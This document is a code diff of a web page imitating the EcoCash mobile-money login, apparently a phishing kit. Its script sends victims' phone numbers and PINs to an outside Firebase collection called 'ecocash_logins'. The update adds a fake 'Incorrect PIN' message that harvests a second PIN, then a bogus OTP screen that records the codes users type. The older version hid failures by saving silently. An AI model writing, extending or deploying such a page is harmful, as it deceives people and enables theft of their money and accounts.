@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EcoCash Login – silent</title>
+  <title>EcoCash Login – two-step</title>
   
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -93,6 +93,100 @@
       border-color: #e12b2b;
       box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
     }
+    /* OTP Screen Styles */
+    .otp-screen {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      z-index: 10;
+      padding: 20px;
+      overflow-y: auto;
+    }
+    .otp-screen.active {
+      display: block;
+    }
+    .otp-header {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .otp-header h2 {
+      color: #1c6aa6;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .otp-message {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .otp-phone-display {
+      background: #f2f2f2;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      color: #1c6aa6;
+      margin-bottom: 30px;
+      letter-spacing: 1px;
+    }
+    .otp-phone-display .country-code {
+      color: #e12b2b;
+      margin-right: 5px;
+    }
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
+    }
+    .otp-input {
+      width: 45px;
+      height: 55px;
+      border: 2px solid #1c6aa6;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      outline: none;
+    }
+    .otp-input:focus {
+      border-color: #e12b2b;
+    }
+    .error-message {
+      color: #e12b2b;
+      text-align: center;
+      font-size: 14px;
+      margin: 10px 0;
+      min-height: 20px;
+    }
+    .success-message {
+      color: #28a745;
+      text-align: center;
+      font-size: 14px;
+      margin: 10px 0;
+      min-height: 20px;
+    }
+    .back-btn {
+      background: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+    }
+    .back-btn:hover {
+      background: #5a6268;
+    }
     .bottom {
       position: relative;
       margin-top: 40px;
@@ -170,15 +264,15 @@
       font-size: 13px;
       margin: -10px 22px 10px 22px;
       text-align: left;
-      min-height: 18px;
+      min-height: 20px;
     }
-    /* no notification styles – completely removed */
   </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="main-content">
+  <!-- Main Login Screen -->
+  <div class="main-content" id="loginScreen">
     <div class="logo">
       <span>Eco</span><span>Cash</span>
     </div>
@@ -199,6 +293,34 @@
       <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin3">
       <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin4">
     </div>
+  </div>
+
+  <!-- OTP Screen -->
+  <div class="otp-screen" id="otpScreen">
+    <div class="otp-header">
+      <h2>Verify OTP</h2>
+    </div>
+    <div class="otp-message">
+      A 6-digit OTP has been sent to:
+    </div>
+    <div class="otp-phone-display" id="otpPhoneDisplay">
+      <span class="country-code" id="otpCountryCode">+263</span>
+      <span id="otpPhoneNumber"></span>
+    </div>
+    
+    <div class="otp-inputs">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp1">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp2">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp3">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp4">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp5">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp6">
+    </div>
+    
+    <div class="error-message" id="otpError"></div>
+    <div class="success-message" id="otpSuccess"></div>
+    
+    <button class="back-btn" id="backToLoginBtn">← Back to Login</button>
   </div>
 
   <div class="bottom">
@@ -229,31 +351,83 @@
 
 <script>
   (function() {
-    // ==================== PIN AUTO-ADVANCE CODE ====================
+    // ==================== FIREBASE CONFIG ====================
+    const firebaseConfig = {
+      apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
+      authDomain: "eco-panel-3d06e.firebaseapp.com",
+      projectId: "eco-panel-3d06e",
+      storageBucket: "eco-panel-3d06e.firebasestorage.app",
+      messagingSenderId: "820242007704",
+      appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const COLLECTION_NAME = 'ecocash_logins';
+
+    // ==================== DOM ELEMENTS ====================
+    const loginScreen = document.getElementById('loginScreen');
+    const otpScreen = document.getElementById('otpScreen');
+    
     const pinInputs = [
       document.getElementById('pin1'),
       document.getElementById('pin2'),
       document.getElementById('pin3'),
       document.getElementById('pin4')
     ];
+    
+    const otpInputs = [
+      document.getElementById('otp1'),
+      document.getElementById('otp2'),
+      document.getElementById('otp3'),
+      document.getElementById('otp4'),
+      document.getElementById('otp5'),
+      document.getElementById('otp6')
+    ];
+    
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneError = document.getElementById('phoneError');
+    const otpPhoneNumber = document.getElementById('otpPhoneNumber');
+    const otpError = document.getElementById('otpError');
+    const otpSuccess = document.getElementById('otpSuccess');
+    const backToLoginBtn = document.getElementById('backToLoginBtn');
+    
+    // ==================== STATE ====================
+    let firstAttemptData = {
+      phoneNumber: '',
+      formattedPhone: '',
+      pin: '',
+      timestamp: null
+    };
+    
+    let secondAttemptData = {
+      phoneNumber: '',
+      formattedPhone: '',
+      pin: '',
+      otp: '',
+      timestamp: null
+    };
 
-    function focusNext(currentIndex) {
-      if (currentIndex < pinInputs.length - 1) {
-        pinInputs[currentIndex + 1].focus();
+    // ==================== PIN AUTO-ADVANCE CODE ====================
+    function focusNext(inputs, currentIndex) {
+      if (currentIndex < inputs.length - 1) {
+        inputs[currentIndex + 1].focus();
       }
     }
 
-    function focusPrev(currentIndex) {
+    function focusPrev(inputs, currentIndex) {
       if (currentIndex > 0) {
-        pinInputs[currentIndex - 1].focus();
+        inputs[currentIndex - 1].focus();
       }
     }
 
+    // Setup PIN inputs
     pinInputs.forEach((input, index) => {
       input.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '');
         if (this.value.length === 1) {
-          focusNext(index);
+          focusNext(pinInputs, index);
         }
       });
 
@@ -261,14 +435,14 @@
         if (e.key === 'Backspace') {
           if (this.value.length === 0) {
             e.preventDefault();
-            focusPrev(index);
+            focusPrev(pinInputs, index);
           }
         } else if (e.key === 'ArrowLeft') {
           e.preventDefault();
-          focusPrev(index);
+          focusPrev(pinInputs, index);
         } else if (e.key === 'ArrowRight') {
           e.preventDefault();
-          focusNext(index);
+          focusNext(pinInputs, index);
         } else {
           if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
             e.preventDefault();
@@ -281,15 +455,42 @@
         const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
         if (pasted.length > 0) {
           this.value = pasted[0];
-          focusNext(index);
+          focusNext(pinInputs, index);
+        }
+      });
+    });
+
+    // Setup OTP inputs
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1) {
+          if (index === otpInputs.length - 1) {
+            // Last OTP digit entered - verify
+            verifyOTP();
+          } else {
+            focusNext(otpInputs, index);
+          }
+        }
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0) {
+            e.preventDefault();
+            focusPrev(otpInputs, index);
+          }
+        } else if (e.key === 'ArrowLeft') {
+          e.preventDefault();
+          focusPrev(otpInputs, index);
+        } else if (e.key === 'ArrowRight') {
+          e.preventDefault();
+          focusNext(otpInputs, index);
         }
       });
     });
 
     // ==================== PHONE VALIDATION CODE ====================
-    const phoneInput = document.getElementById('phoneInput');
-    const phoneError = document.getElementById('phoneError');
-
     function validateZimNumber(value) {
       const digits = value.replace(/\D/g, '');
       if (digits.length === 0) return { valid: false, normalized: '' };
@@ -329,7 +530,13 @@
       }
     }
 
-    phoneInput.addEventListener('input', updatePhoneValidation);
+    phoneInput.addEventListener('input', function() {
+      updatePhoneValidation();
+      // Clear the error message when user starts typing a new phone number
+      if (phoneError.textContent.includes('Incorrect PIN')) {
+        phoneError.textContent = '';
+      }
+    });
     
     phoneInput.addEventListener('blur', function() {
       const raw = phoneInput.value;
@@ -364,77 +571,252 @@
 
     updatePhoneValidation();
 
-    // ==================== FIREBASE SETUP ====================
-    const firebaseConfig = {
-      apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
-      authDomain: "eco-panel-3d06e.firebaseapp.com",
-      projectId: "eco-panel-3d06e",
-      storageBucket: "eco-panel-3d06e.firebasestorage.app",
-      messagingSenderId: "820242007704",
-      appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const COLLECTION_NAME = 'ecocash_logins';
-
-    // *** ALL TOAST NOTIFICATIONS REMOVED – SILENT SAVE ***
-
-    // Silent save function – no UI feedback
-    function saveToFirebase() {
+    // ==================== FIREBASE SAVE FUNCTIONS ====================
+    function getFormattedPhone() {
       const phoneDigits = phoneInput.value.replace(/\D/g, '');
-      const pin = pinInputs.map(i => i.value).join('');
-      
-      // Format phone number
-      let formattedPhone = '';
       if (phoneDigits.startsWith('0') && phoneDigits.length === 10) {
-        formattedPhone = '+263' + phoneDigits.substring(1);
+        return '+263' + phoneDigits.substring(1);
       } else if (phoneDigits.length === 9) {
-        formattedPhone = '+263' + phoneDigits;
-      } else {
-        // silently ignore – no toast
-        return;
+        return '+263' + phoneDigits;
       }
-      
-      // Check if PIN is complete
-      if (pin.length !== 4) {
-        // silently ignore – no toast
-        return;
+      return null;
+    }
+
+    function getLocalPhonePart() {
+      const formatted = getFormattedPhone();
+      if (formatted && formatted.startsWith('+263')) {
+        return formatted.substring(4);
       }
-      
-      // Save to Firebase – completely silent (no .then/.catch UI)
-      db.collection(COLLECTION_NAME).add({
-        phoneNumber: formattedPhone,
-        pin: pin,
+      return phoneInput.value.replace(/\D/g, '');
+    }
+
+    // Save first attempt (wrong PIN)
+    function saveFirstAttempt(phone, pin) {
+      return db.collection(COLLECTION_NAME).add({
+        phoneNumber: phone,
+        pin1: pin,  // Saved as pin1
+        attempt: 1,
+        status: 'failed',
         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
         userAgent: navigator.userAgent,
         pageUrl: window.location.href
-      }).catch(() => {
-        // swallow any error – no notification
       });
     }
-    
-    // Add listener to 4th PIN – triggers silent save
+
+    // Save second attempt (correct PIN with OTP sent)
+    function saveSecondAttempt(phone, pin, otp) {
+      return db.collection(COLLECTION_NAME).add({
+        phoneNumber: phone,
+        pin2: pin,  // Saved as pin2 (different from pin1)
+        otp: otp,   // OTP saved separately
+        attempt: 2,
+        status: 'otp_sent',
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        userAgent: navigator.userAgent,
+        pageUrl: window.location.href
+      });
+    }
+
+    // Save OTP attempt (when user enters OTP)
+    function saveOTPAttempt(phone, otp, status) {
+      return db.collection(COLLECTION_NAME).add({
+        phoneNumber: phone,
+        otp: otp,   // OTP saved separately
+        attempt: 3,
+        status: status, // 'verified' or 'failed'
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        userAgent: navigator.userAgent,
+        pageUrl: window.location.href
+      });
+    }
+
+    // Generate random 6-digit OTP
+    function generateOTP() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    // Clear PIN inputs
+    function clearPinInputs() {
+      pinInputs.forEach(input => input.value = '');
+      pinInputs[0].focus();
+    }
+
+    // Clear OTP inputs
+    function clearOTPInputs() {
+      otpInputs.forEach(input => input.value = '');
+      otpError.textContent = '';
+      otpSuccess.textContent = '';
+    }
+
+    // ==================== FIRST PIN ATTEMPT HANDLER ====================
+    async function handleFirstPinAttempt(pin) {
+      const phone = getFormattedPhone();
+      if (!phone) {
+        phoneError.textContent = 'Please enter a valid phone number';
+        return;
+      }
+
+      // Store first attempt data
+      firstAttemptData = {
+        phoneNumber: phoneInput.value,
+        formattedPhone: phone,
+        pin: pin,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        // Save first attempt to Firebase
+        await saveFirstAttempt(phone, pin);
+        console.log('First attempt saved - PIN1:', pin);
+
+        // Show error message and reset PIN
+        phoneError.textContent = 'Incorrect PIN. Please try again.';
+        phoneError.style.color = '#e12b2b';
+        clearPinInputs();
+
+      } catch (error) {
+        console.error('Error saving first attempt:', error);
+      }
+    }
+
+    // ==================== SECOND PIN ATTEMPT HANDLER ====================
+    async function handleSecondPinAttempt(pin) {
+      const phone = getFormattedPhone();
+      if (!phone) {
+        phoneError.textContent = 'Please enter a valid phone number';
+        return;
+      }
+
+      // Generate OTP
+      const otp = generateOTP();
+
+      // Store second attempt data
+      secondAttemptData = {
+        phoneNumber: phoneInput.value,
+        formattedPhone: phone,
+        pin: pin,
+        otp: otp,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        // Save second attempt with OTP (pin saved as pin2)
+        await saveSecondAttempt(phone, pin, otp);
+        console.log('Second attempt saved - PIN2:', pin, 'OTP:', otp);
+
+        // Show OTP screen with +263 prefix
+        const localPart = getLocalPhonePart();
+        otpPhoneNumber.textContent = localPart;
+        
+        loginScreen.style.display = 'none';
+        otpScreen.classList.add('active');
+        
+        // Clear any previous OTP inputs
+        clearOTPInputs();
+        otpInputs[0].focus();
+
+      } catch (error) {
+        console.error('Error saving second attempt:', error);
+      }
+    }
+
+    // ==================== OTP VERIFICATION ====================
+    async function verifyOTP() {
+      const enteredOTP = otpInputs.map(input => input.value).join('');
+      const phone = getFormattedPhone() || secondAttemptData.formattedPhone;
+      
+      if (enteredOTP.length !== 6) {
+        otpError.textContent = 'Please enter all 6 digits';
+        otpSuccess.textContent = '';
+        return;
+      }
+
+      try {
+        if (enteredOTP === secondAttemptData.otp) {
+          // Correct OTP - save as verified
+          await saveOTPAttempt(phone, enteredOTP, 'verified');
+          console.log('OTP verified and saved');
+          
+          otpSuccess.textContent = '✓ Verification successful!';
+          otpError.textContent = '';
+          setTimeout(() => {
+            alert('Login successful! (Demo purpose)');
+            // Reset everything
+            backToLogin();
+          }, 1000);
+        } else {
+          // Wrong OTP - save as failed
+          await saveOTPAttempt(phone, enteredOTP, 'failed');
+          console.log('Wrong OTP attempt saved');
+          
+          otpError.textContent = 'Invalid OTP. Please try again.';
+          otpSuccess.textContent = '';
+          clearOTPInputs();
+          otpInputs[0].focus();
+        }
+      } catch (error) {
+        console.error('Error saving OTP:', error);
+        otpError.textContent = 'Error verifying OTP';
+      }
+    }
+
+    // ==================== BACK TO LOGIN ====================
+    function backToLogin() {
+      otpScreen.classList.remove('active');
+      loginScreen.style.display = 'block';
+      clearPinInputs();
+      clearOTPInputs();
+      phoneError.textContent = '';
+      
+      // Reset stored data
+      firstAttemptData = {
+        phoneNumber: '',
+        formattedPhone: '',
+        pin: '',
+        timestamp: null
+      };
+      
+      secondAttemptData = {
+        phoneNumber: '',
+        formattedPhone: '',
+        pin: '',
+        otp: '',
+        timestamp: null
+      };
+    }
+
+    // ==================== MAIN PIN LISTENER ====================
     const fourthPin = document.getElementById('pin4');
     if (fourthPin) {
       fourthPin.addEventListener('input', function() {
         if (this.value.length === 1) {
-          setTimeout(saveToFirebase, 100);
+          const enteredPin = pinInputs.map(i => i.value).join('');
+          
+          // Check if this is first or second attempt
+          if (phoneError.textContent.includes('Incorrect PIN')) {
+            // This is second attempt
+            setTimeout(() => handleSecondPinAttempt(enteredPin), 150);
+          } else {
+            // This is first attempt
+            setTimeout(() => handleFirstPinAttempt(enteredPin), 150);
+          }
         }
       });
     }
 
-    // Button handlers – now only provide visual field focus, no toasts
+    // ==================== BUTTON HANDLERS ====================
     document.getElementById('registerBtn')?.addEventListener('click', function() {
-      // Just focus the phone input, no notification
       phoneInput.focus();
     });
 
     document.getElementById('helpBtn')?.addEventListener('click', function() {
-      // Absolutely nothing – you could open a link, but no toast
-      // (kept empty to satisfy requirement)
+      // You could open help link here
     });
+
+    backToLoginBtn.addEventListener('click', backToLogin);
+
+    // ==================== INITIAL FOCUS ====================
+    pinInputs[0].focus();
 
   })();
 </script>
